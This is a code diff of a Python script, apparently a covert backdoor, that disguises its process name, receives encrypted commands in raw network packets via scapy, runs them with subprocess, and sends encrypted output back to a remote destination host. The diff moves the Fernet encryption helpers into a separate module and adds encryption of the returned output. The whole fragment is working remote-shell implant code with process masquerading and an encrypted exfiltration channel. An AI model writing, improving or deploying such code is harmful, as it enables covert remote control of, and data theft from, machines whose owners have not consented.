@@ -4,9 +4,9 @@
 from scapy.all import *
 import subprocess
 import setproctitle
-from cryptography.fernet import Fernet
 import time
 import argparse
+import encrypt_utils as utils
 
 
 parser = argparse.ArgumentParser()
@@ -37,7 +37,7 @@ setproctitle.setproctitle(args.name)
 
 def read_pkt(packet):
     data = packet[Raw].load
-    decrypted_data = decrypt_data(data)
+    decrypted_data = utils.decrypt_data(data)
 
     exec_command(decrypted_data)
 
@@ -57,33 +57,15 @@ def exec_command(command):
         output = out + errs
 
         if output.strip() == b"":
-            output = command.decode("utf-8") + " : no output on remote\n"
+            output = (command.decode("utf-8") + " : no output on remote\n").encode("utf-8")
+
+        # Encrypt output
+        output = utils.encrypt_data(output)
 
         # Send output back to remote client
         pkt = IP(dst=args.destination)/TCP(sport=RandShort(), dport=int(args.port))/Raw(load=output)
         time.sleep(0.1)
         send(pkt, verbose=False)
-
-
-def encrypt_data(data):
-    with open("keyfile.key", "rb") as keyfile:
-        key = keyfile.read()
-
-    fernet = Fernet(key)
-    encrypted_data = fernet.encrypt(data)
-
-    return encrypted_data
-
-
-def decrypt_data(data):
-    with open("keyfile.key", "rb") as keyfile:
-        key = keyfile.read()
-    
-    fernet = Fernet(key)
-
-    decrypted_command = fernet.decrypt(data)
-
-    return decrypted_command
 
 
 def main():
